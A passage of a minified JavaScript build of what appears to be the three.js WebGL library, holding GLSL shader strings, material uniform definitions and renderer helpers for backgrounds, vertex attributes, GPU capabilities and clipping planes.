);\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_phong_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphong_vert:"#define PHONG\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshphysical_frag:"#define STANDARD\n#ifdef PHYSICAL\n\t#define REFLECTIVITY\n\t#define CLEARCOAT\n\t#define TRANSMISSION\n#endif\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float roughness;\nuniform float metalness;\nuniform float opacity;\n#ifdef TRANSMISSION\n\tuniform float transmission;\n#endif\n#ifdef REFLECTIVITY\n\tuniform float reflectivity;\n#endif\n#ifdef CLEARCOAT\n\tuniform float clearcoat;\n\tuniform float clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tuniform vec3 sheen;\n#endif\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <transmissionmap_pars_fragment>\n#include <bsdfs>\n#include <cube_uv_reflection_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_physical_pars_fragment>\n#include <fog_pars_fragment>\n#include <lights_pars_begin>\n#include <lights_physical_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <clearcoat_pars_fragment>\n#include <roughnessmap_pars_fragment>\n#include <metalnessmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#ifdef TRANSMISSION\n\t\tfloat totalTransmission = transmission;\n\t#endif\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <roughnessmap_fragment>\n\t#include <metalnessmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <clearcoat_normal_fragment_begin>\n\t#include <clearcoat_normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <transmissionmap_fragment>\n\t#include <lights_physical_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#ifdef TRANSMISSION\n\t\tdiffuseColor.a *= mix( saturate( 1. - totalTransmission + linearToRelativeLuminance( reflectedLight.directSpecular + reflectedLight.indirectSpecular ) ), 1.0, metalness );\n\t#endif\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphysical_vert:"#define STANDARD\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",normal_frag:"#define NORMAL\nuniform float opacity;\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <packing>\n#include <uv_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\t#include <logdepthbuf_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\n}",normal_vert:"#define NORMAL\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif\n}",points_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <color_pars_fragment>\n#include <map_particle_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_particle_fragment>\n\t#include <color_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n}",points_vert:"uniform float size;\nuniform float scale;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\tgl_PointSize = size;\n\t#ifdef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );\n\t#endif\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <fog_vertex>\n}",shadow_frag:"uniform vec3 color;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\nvoid main() {\n\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",shadow_vert:"#include <common>\n#include <fog_pars_vertex>\n#include <shadowmap_pars_vertex>\nvoid main() {\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",sprite_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",sprite_vert:"uniform float rotation;\nuniform vec2 center;\n#include <common>\n#include <uv_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\tvec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\n\tvec2 scale;\n\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\n\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\n\t#ifndef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) scale *= - mvPosition.z;\n\t#endif\n\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\n\tvec2 rotatedPosition;\n\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\n\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\n\tmvPosition.xy += rotatedPosition;\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}"},Gn={common:{diffuse:{value:new Lt(15658734)},opacity:{value:1},map:{value:null},uvTransform:{value:new ae},uv2Transform:{value:new ae},alphaMap:{value:null}},specularmap:{specularMap:{value:null}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98},maxMipLevel:{value:0}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new ie(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new Lt(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new Lt(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},uvTransform:{value:new ae}},sprite:{diffuse:{value:new Lt(15658734)},opacity:{value:1},center:{value:new ie(.5,.5)},rotation:{value:0},map:{value:null},alphaMap:{value:null},uvTransform:{value:new ae}}},Wn={basic:{uniforms:Tn([Gn.common,Gn.specularmap,Gn.envmap,Gn.aomap,Gn.lightmap,Gn.fog]),vertexShader:Qn.meshbasic_vert,fragmentShader:Qn.meshbasic_frag},lambert:{uniforms:Tn([Gn.common,Gn.specularmap,Gn.envmap,Gn.aomap,Gn.lightmap,Gn.emissivemap,Gn.fog,Gn.lights,{emissive:{value:new Lt(0)}}]),vertexShader:Qn.meshlambert_vert,fragmentShader:Qn.meshlambert_frag},phong:{uniforms:Tn([Gn.common,Gn.specularmap,Gn.envmap,Gn.aomap,Gn.lightmap,Gn.emissivemap,Gn.bumpmap,Gn.normalmap,Gn.displacementmap,Gn.fog,Gn.lights,{emissive:{value:new Lt(0)},specular:{value:new Lt(1118481)},shininess:{value:30}}]),vertexShader:Qn.meshphong_vert,fragmentShader:Qn.meshphong_frag},standard:{uniforms:Tn([Gn.common,Gn.envmap,Gn.aomap,Gn.lightmap,Gn.emissivemap,Gn.bumpmap,Gn.normalmap,Gn.displacementmap,Gn.roughnessmap,Gn.metalnessmap,Gn.fog,Gn.lights,{emissive:{value:new Lt(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:Qn.meshphysical_vert,fragmentShader:Qn.meshphysical_frag},toon:{uniforms:Tn([Gn.common,Gn.aomap,Gn.lightmap,Gn.emissivemap,Gn.bumpmap,Gn.normalmap,Gn.displacementmap,Gn.gradientmap,Gn.fog,Gn.lights,{emissive:{value:new Lt(0)}}]),vertexShader:Qn.meshtoon_vert,fragmentShader:Qn.meshtoon_frag},matcap:{uniforms:Tn([Gn.common,Gn.bumpmap,Gn.normalmap,Gn.displacementmap,Gn.fog,{matcap:{value:null}}]),vertexShader:Qn.meshmatcap_vert,fragmentShader:Qn.meshmatcap_frag},points:{uniforms:Tn([Gn.points,Gn.fog]),vertexShader:Qn.points_vert,fragmentShader:Qn.points_frag},dashed:{uniforms:Tn([Gn.common,Gn.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Qn.linedashed_vert,fragmentShader:Qn.linedashed_frag},depth:{uniforms:Tn([Gn.common,Gn.displacementmap]),vertexShader:Qn.depth_vert,fragmentShader:Qn.depth_frag},normal:{uniforms:Tn([Gn.common,Gn.bumpmap,Gn.normalmap,Gn.displacementmap,{opacity:{value:1}}]),vertexShader:Qn.normal_vert,fragmentShader:Qn.normal_frag},sprite:{uniforms:Tn([Gn.sprite,Gn.fog]),vertexShader:Qn.sprite_vert,fragmentShader:Qn.sprite_frag},background:{uniforms:{uvTransform:{value:new ae},t2D:{value:null}},vertexShader:Qn.background_vert,fragmentShader:Qn.background_frag},cube:{uniforms:Tn([Gn.envmap,{opacity:{value:1}}]),vertexShader:Qn.cube_vert,fragmentShader:Qn.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:Qn.equirect_vert,fragmentShader:Qn.equirect_frag},distanceRGBA:{uniforms:Tn([Gn.common,Gn.displacementmap,{referencePosition:{value:new he},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:Qn.distanceRGBA_vert,fragmentShader:Qn.distanceRGBA_frag},shadow:{uniforms:Tn([Gn.lights,Gn.fog,{color:{value:new Lt(0)},opacity:{value:1}}]),vertexShader:Qn.shadow_vert,fragmentShader:Qn.shadow_frag}};function Kn(e,t,n,r,i){var a,s,l=new Lt(0),c=0,u=null,d=0,p=null;function h(e,t){n.buffers.color.setClear(e.r,e.g,e.b,t,i)}return{getClearColor:function(){return l},setClearColor:function(e,t){l.set(e),h(l,c=void 0!==t?t:1)},getClearAlpha:function(){return c},setClearAlpha:function(e){h(l,c=e)},render:function(n,i,f,A){var m=!0===i.isScene?i.background:null;m&&m.isTexture&&(m=t.get(m));var v=e.xr,g=v.getSession&&v.getSession();g&&"additive"===g.environmentBlendMode&&(m=null),null===m?h(l,c):m&&m.isColor&&(h(m,1),A=!0),(e.autoClear||A)&&e.clear(e.autoClearColor,e.autoClearDepth,e.autoClearStencil),m&&(m.isCubeTexture||m.isWebGLCubeRenderTarget||m.mapping===o)?(void 0===s&&((s=new Sn(new Bn(1,1,1),new In({name:"BackgroundCubeMaterial",uniforms:En(Wn.cube.uniforms),vertexShader:Wn.cube.vertexShader,fragmentShader:Wn.cube.fragmentShader,side:1,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.deleteAttribute("normal"),s.geometry.deleteAttribute("uv"),s.onBeforeRender=function(e,t,n){this.matrixWorld.copyPosition(n.matrixWorld)},Object.defineProperty(s.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),r.update(s)),m.isWebGLCubeRenderTarget&&(m=m.texture),s.material.uniforms.envMap.value=m,s.material.uniforms.flipEnvMap.value=m.isCubeTexture&&m._needsFlipEnvMap?-1:1,u===m&&d===m.version&&p===e.toneMapping||(s.material.needsUpdate=!0,d=(u=m).version,p=e.toneMapping),n.unshift(s,s.geometry,s.material,0,0,null)):m&&m.isTexture&&(void 0===a&&((a=new Sn(new Vn(2,2),new In({name:"BackgroundMaterial",uniforms:En(Wn.background.uniforms),vertexShader:Wn.background.vertexShader,fragmentShader:Wn.background.fragmentShader,side:0,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.deleteAttribute("normal"),Object.defineProperty(a.material,"map",{get:function(){return this.uniforms.t2D.value}}),r.update(a)),!0===(a.material.uniforms.t2D.value=m).matrixAutoUpdate&&m.updateMatrix(),a.material.uniforms.uvTransform.value.copy(m.matrix),u===m&&d===m.version&&p===e.toneMapping||(a.material.needsUpdate=!0,d=(u=m).version,p=e.toneMapping),n.unshift(a,a.geometry,a.material,0,0,null))}}}function qn(e,t,n,r){var i=e.getParameter(34921),a=r.isWebGL2?null:t.get("OES_vertex_array_object"),o=r.isWebGL2||null!==a,s={},l=p(null),c=l;function u(t){return r.isWebGL2?e.bindVertexArray(t):a.bindVertexArrayOES(t)}function d(t){return r.isWebGL2?e.deleteVertexArray(t):a.deleteVertexArrayOES(t)}function p(e){for(var t=[],n=[],r=[],a=0;a<i;a++)t[a]=0,n[a]=0,r[a]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:t,enabledAttributes:n,attributeDivisors:r,object:e,attributes:{},index:null}}function h(){for(var e=c.newAttributes,t=0,n=e.length;t<n;t++)e[t]=0}function f(e){A(e,0)}function A(n,i){var a=c.newAttributes,o=c.enabledAttributes,s=c.attributeDivisors;a[n]=1,0===o[n]&&(e.enableVertexAttribArray(n),o[n]=1),s[n]!==i&&((r.isWebGL2?e:t.get("ANGLE_instanced_arrays"))[r.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](n,i),s[n]=i)}function m(){for(var t=c.newAttributes,n=c.enabledAttributes,r=0,i=n.length;r<i;r++)n[r]!==t[r]&&(e.disableVertexAttribArray(r),n[r]=0)}function v(t,n,i,a,o,s){!0!==r.isWebGL2||5124!==i&&5125!==i?e.vertexAttribPointer(t,n,i,a,o,s):e.vertexAttribIPointer(t,n,i,o,s)}function g(){y(),c!==l&&u((c=l).object)}function y(){l.geometry=null,l.program=null,l.wireframe=!1}return{setup:function(i,l,d,g,y){var b=!1;if(o){var _=function(t,n,i){var o=!0===i.wireframe,l=s[t.id];void 0===l&&(l={},s[t.id]=l);var c=l[n.id];void 0===c&&(c={},l[n.id]=c);var u=c[o];return void 0===u&&(u=p(r.isWebGL2?e.createVertexArray():a.createVertexArrayOES()),c[o]=u),u}(g,d,l);c!==_&&u((c=_).object),(b=function(e,t){var n=c.attributes,r=e.attributes;if(Object.keys(n).length!==Object.keys(r).length)return!0;for(var i in r){var a=n[i],o=r[i];if(void 0===a)return!0;if(a.attribute!==o)return!0;if(a.data!==o.data)return!0}return c.index!==t}(g,y))&&function(e,t){var n={},r=e.attributes;for(var i in r){var a=r[i],o={};(o.attribute=a).data&&(o.data=a.data),n[i]=o}c.attributes=n,c.index=t}(g,y)}else{var w=!0===l.wireframe;c.geometry===g.id&&c.program===d.id&&c.wireframe===w||(c.geometry=g.id,c.program=d.id,c.wireframe=w,b=!0)}!0===i.isInstancedMesh&&(b=!0),null!==y&&n.update(y,34963),b&&(function(i,a,o,s){if(!1!==r.isWebGL2||!i.isInstancedMesh&&!s.isInstancedBufferGeometry||null!==t.get("ANGLE_instanced_arrays")){h();var l=s.attributes,c=o.getAttributes(),u=a.defaultAttributeValues;for(var d in c){var p=c[d];if(0<=p){var g=l[d];if(void 0!==g){var y=g.normalized,b=g.itemSize,_=n.get(g);if(void 0===_)continue;var w=_.buffer,C=_.type,x=_.bytesPerElement;if(g.isInterleavedBufferAttribute){var S=g.data,k=S.stride,M=g.offset;S&&S.isInstancedInterleavedBuffer?(A(p,S.meshPerAttribute),void 0===s._maxInstanceCount&&(s._maxInstanceCount=S.meshPerAttribute*S.count)):f(p),e.bindBuffer(34962,w),v(p,b,C,y,k*x,M*x)}else g.isInstancedBufferAttribute?(A(p,g.meshPerAttribute),void 0===s._maxInstanceCount&&(s._maxInstanceCount=g.meshPerAttribute*g.count)):f(p),e.bindBuffer(34962,w),v(p,b,C,y,0,0)}else if("instanceMatrix"===d){var B=n.get(i.instanceMatrix);if(void 0===B)continue;var E=B.buffer,T=B.type;A(p+0,1),A(p+1,1),A(p+2,1),A(p+3,1),e.bindBuffer(34962,E),e.vertexAttribPointer(p+0,4,T,!1,64,0),e.vertexAttribPointer(p+1,4,T,!1,64,16),e.vertexAttribPointer(p+2,4,T,!1,64,32),e.vertexAttribPointer(p+3,4,T,!1,64,48)}else if("instanceColor"===d){var P=n.get(i.instanceColor);if(void 0===P)continue;var I=P.buffer,F=P.type;A(p,1),e.bindBuffer(34962,I),e.vertexAttribPointer(p,3,F,!1,12,0)}else if(void 0!==u){var L=u[d];if(void 0!==L)switch(L.length){case 2:e.vertexAttrib2fv(p,L);break;case 3:e.vertexAttrib3fv(p,L);break;case 4:e.vertexAttrib4fv(p,L);break;default:e.vertexAttrib1fv(p,L)}}}}m()}}(i,l,d,g),null!==y&&e.bindBuffer(34963,n.get(y).buffer))},reset:g,resetDefaultState:y,dispose:function(){for(var e in g(),s){var t=s[e];for(var n in t){var r=t[n];for(var i in r)d(r[i].object),delete r[i];delete t[n]}delete s[e]}},releaseStatesOfGeometry:function(e){if(void 0!==s[e.id]){var t=s[e.id];for(var n in t){var r=t[n];for(var i in r)d(r[i].object),delete r[i];delete t[n]}delete s[e.id]}},releaseStatesOfProgram:function(e){for(var t in s){var n=s[t];if(void 0!==n[e.id]){var r=n[e.id];for(var i in r)d(r[i].object),delete r[i];delete n[e.id]}}},initAttributes:h,enableAttribute:f,disableUnusedAttributes:m}}function Xn(e,t,n,r){var i,a=r.isWebGL2;this.setMode=function(e){i=e},this.render=function(t,r){e.drawArrays(i,t,r),n.update(r,i,1)},this.renderInstances=function(r,o,s){if(0!==s){var l,c;if(a)l=e,c="drawArraysInstanced";else if(c="drawArraysInstancedANGLE",null===(l=t.get("ANGLE_instanced_arrays")))return;l[c](i,r,o,s),n.update(o,i,s)}}}function Yn(e,t,n){var r;function i(t){if("highp"===t){if(0<e.getShaderPrecisionFormat(35633,36338).precision&&0<e.getShaderPrecisionFormat(35632,36338).precision)return"highp";t="mediump"}return"mediump"===t&&0<e.getShaderPrecisionFormat(35633,36337).precision&&0<e.getShaderPrecisionFormat(35632,36337).precision?"mediump":"lowp"}var a="undefined"!=typeof WebGL2RenderingContext&&e instanceof WebGL2RenderingContext||"undefined"!=typeof WebGL2ComputeRenderingContext&&e instanceof WebGL2ComputeRenderingContext,o=void 0!==n.precision?n.precision:"highp",s=i(o);s!==o&&(o=s);var l=!0===n.logarithmicDepthBuffer,c=e.getParameter(34930),u=e.getParameter(35660),d=e.getParameter(3379),p=e.getParameter(34076),h=e.getParameter(34921),f=e.getParameter(36347),A=e.getParameter(36348),m=e.getParameter(36349),v=0<u,g=a||!!t.get("OES_texture_float");return{isWebGL2:a,getMaxAnisotropy:function(){if(void 0!==r)return r;var n=t.get("EXT_texture_filter_anisotropic");return r=null!==n?e.getParameter(n.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0},getMaxPrecision:i,precision:o,logarithmicDepthBuffer:l,maxTextures:c,maxVertexTextures:u,maxTextureSize:d,maxCubemapSize:p,maxAttributes:h,maxVertexUniforms:f,maxVaryings:A,maxFragmentUniforms:m,vertexTextures:v,floatFragmentTextures:g,floatVertexTextures:v&&g,maxSamples:a?e.getParameter(36183):0}}function Jn(e){var t=this,n=null,r=0,i=!1,a=!1,o=new mt,s=new ae,l={value:null,needsUpdate:!1};function c(){l.value!==n&&(l.value=n,l.needsUpdate=0<r),t.numPlanes=r,t.numIntersection=0}function u(e,n,r,i){var a=null!==e?e.length:0,c=null;if(0!==a){if(c=l.value,!0!==i||null===c){var u=r+4*a,d=n.matrixWorldInverse;s.getNormalMatrix(d),(null===c||c.length<u)&&(c=new Float32Array(u));for(var p=0,h=r;p!==a;++p,h+=4)o.copy(e[p]).applyMatrix4(d,s),o.normal.toArray(c,h),c[h+3]=o.constant}l.value=c,l.needsUpdate=!0}return t.numPlanes=a,t.numIntersection=0,c}this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(e,t,a){var o=0!==e.length||t||0!==r||i;return i=t,n=u(e,a,0),r=e.length,o},this.beginShadows=function(){a=!0,u(null)},this.endShadows=function(){a=!1,c()},this.setState=function(t,o,s){var d=t.clippingPlanes,p=t.clipIntersection,h=t.clipShadows,f=e.get(t);if(!i||null===d||0===d.length||a&&!h)a?u(null):c();else{var A=a?0:r,m=4*A,v=f.clippingState||null;l.value=v,v=u(d,o,m,s);for(var 